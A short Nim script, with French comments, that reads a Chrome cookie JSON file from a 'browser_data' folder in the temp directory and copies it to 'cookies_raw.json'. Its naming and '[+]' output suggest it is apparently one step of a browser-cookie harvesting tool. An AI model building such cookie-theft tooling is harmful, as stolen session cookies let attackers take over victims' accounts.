import os, json

let cookiesFile = getTempDir() / "browser_data" / "chrome_default_cookie.json"

if fileExists(cookiesFile):
  let content = readFile(cookiesFile)
  
  # Sauvegarder le JSON complet
  let outputFile = getTempDir() / "cookies_raw.json"
  writeFile(outputFile, content)
  echo "[+] JSON complet sauvegardé: ", outputFile